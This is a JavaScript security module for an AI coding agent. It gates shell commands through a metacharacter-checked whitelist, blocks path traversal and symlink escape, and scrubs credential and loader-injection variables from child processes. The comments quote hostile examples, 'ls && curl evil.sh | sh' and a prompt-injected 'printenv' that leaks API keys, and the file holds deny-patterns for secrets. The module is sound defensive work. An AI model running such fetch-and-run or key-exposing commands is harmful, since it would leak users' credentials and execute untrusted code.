// security.js — workspace confinement and command gating.
import fs from 'node:fs';
import path from 'node:path';
import { config } from '../config.js';

const SAFE_COMMANDS_WHITELIST = [
'git status',
'git diff',
'git log',
'git show',
'npm test',
'npm run test',
'ls',
'dir',
'pwd'
];

// Shell metacharacters that turn a benign prefix into an arbitrary command
// (e.g. `ls && curl evil.sh | sh`). A whitelist match containing any of these
// must NOT bypass the safe-mode confirmation. IMPROVEMENTS.md §1.1.
const METACHARACTERS = /[;&|`<>\n]|\$\(/;

// ── Subprocess environment scrub ──────────────────────────────────────────────
// runCommand is the one place where model-authored text becomes a process. The
// emile process legitimately holds provider credentials in process.env
// (config.js ENV_KEY_MAP reads REQUESTY/OPENROUTER/OPENCODE_API_KEY), but a
// CHILD of an approved command must never see them: an `npm install`
// postinstall script, a fetched `curl | sh` payload or a prompt-injected
// `printenv` would otherwise read the keys straight out of its own environment
// and ship them out — or echo them back into the tool result, the model context
// and the persisted session. Approval to RUN a command is not consent to expose
// the environment, and emile has no OS sandbox to fall back on, so this name
// deny-list is the substitute (deep-dive § 22.3; grok
// xai-grok-sandbox/src/command/policy.rs:138-156).
//
// Deny-by-pattern, never allow-by-list: the child is the user's own build tool
// (compilers, package managers, cloud CLIs, test runners), which reads dozens
// of variables a list would not know about. Only secret-shaped and
// injection-prone names are removed, so PATH, PATHEXT, SYSTEMROOT, COMSPEC,
// TEMP, HOME/USERPROFILE, LANG and friends always survive.
const SCRUBBED_ENV_PATTERNS = [
  /KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL/i, // credentials of any kind
  /(_|^)PAT$/i,                                   // GitLab/GitHub personal-access-token style
  /^LD_PRELOAD$/i,                                // library-injection vectors
  /^LD_LIBRARY_PATH$/i,
  /^DYLD_/i,
  /^EMILE_/i,                                     // emile's own surface: a child never needs it
];

/**
 * Copies `baseEnv` and removes every variable a tool-executed subprocess must
 * not read.
 *
 * Policy: children of tool-executed commands must NEVER see provider
 * credentials or injection-prone loader variables — the model's own commands
 * are untrusted input, and the command is handed to the OS shell, which passes
 * its environment to everything it spawns. Only the child is scrubbed: the
 * emile process keeps its own environment, so `config.js` key resolution and
 * the running session are unaffected.
 *
 * Matching is case-insensitive on the NAME because Windows environment names
 * are case-insensitive (`Requesty_Api_KEY` is the same variable as
 * `REQUESTY_API_KEY`). There is deliberately no toggle, flag or env var that
 * narrows this list — a security gate with a bypass is not a gate.
 *
 * @param {Record<string, string | undefined>} [baseEnv] environment to scrub; defaults to `process.env`
 * @returns {Record<string, string | undefined>} scrubbed copy; `baseEnv` is never mutated
 */
export function buildScrubbedEnv(baseEnv = process.env) {
  const env = { ...baseEnv };
  for (const name of Object.keys(env)) {
    if (SCRUBBED_ENV_PATTERNS.some((pattern) => pattern.test(name))) {
      delete env[name];
    }
  }
  return env;
}

// Checks if a command belongs to the safe commands whitelist. A whitelist
// prefix match is only "safe" when the whole line is free of shell
// metacharacters — prefix matching alone is injectable.
export function isSafeCommand(command) {
  const cleanCmd = command.trim().toLowerCase();
  const matched = SAFE_COMMANDS_WHITELIST.some(safeCmd =>
    cleanCmd === safeCmd || cleanCmd.startsWith(safeCmd + ' ')
  );
  if (!matched) return false;
  return !METACHARACTERS.test(command); // reject injection attempts
}

// Resolve and validate paths inside the workspace, protecting against path
// traversal AND symlink escape (a symlink inside the workspace pointing
// outside must not allow reads/writes outside the sandbox).
// New files (not yet on disk) are validated through their nearest existing
// ancestor so `writeFile` keeps working for fresh paths. IMPROVEMENTS.md §1.2.
export function resolveSafePath(userPath, {
  root = config.workspaceDir,
  label = 'workspace',
  preserveFinalEntry = false,
} = {}) {
  const capabilityRoot = path.resolve(root);
  const resolved = path.resolve(capabilityRoot, userPath);
  let workspaceReal;
  try {
    workspaceReal = fs.realpathSync(capabilityRoot);
  } catch {
    workspaceReal = capabilityRoot;
  }

  let real;
  try {
    const finalStat = fs.lstatSync(resolved);
    if (preserveFinalEntry && finalStat.isSymbolicLink()) {
      real = path.join(fs.realpathSync(path.dirname(resolved)), path.basename(resolved));
    } else {
      real = fs.realpathSync(resolved);
    }
  } catch {
    // Path does not exist yet (write path): validate via the deepest existing ancestor.
    let dir = path.dirname(resolved);
    const remainder = [];
    while (true) {
      try {
        real = path.join(fs.realpathSync(dir), ...[...remainder].reverse());
        break;
      } catch {
        if (dir === path.dirname(dir)) { real = resolved; break; } // reached root
        remainder.push(path.basename(dir));
        dir = path.dirname(dir);
      }
    }
  }

  const relative = path.relative(workspaceReal, real);
  const isOutside = relative.startsWith('..') || path.isAbsolute(relative);

  if (isOutside && real !== workspaceReal) {
    throw new Error(`Access denied: path "${userPath}" resolves outside of ${label} "${capabilityRoot}"`);
  }
  return resolved;
}

/**
 * Validates a persisted or shell-reported working directory. Returning null
 * instead of throwing lets callers safely fall back to the workspace root.
 */
export function normalizeWorkspaceCwd(candidate) {
  if (typeof candidate !== 'string' || candidate.length === 0) return null;
  try {
    const resolved = resolveSafePath(candidate);
    if (!fs.statSync(resolved).isDirectory()) return null;
    return resolved;
  } catch {
    return null;
  }
}

// Generate and display diff using centralized UI
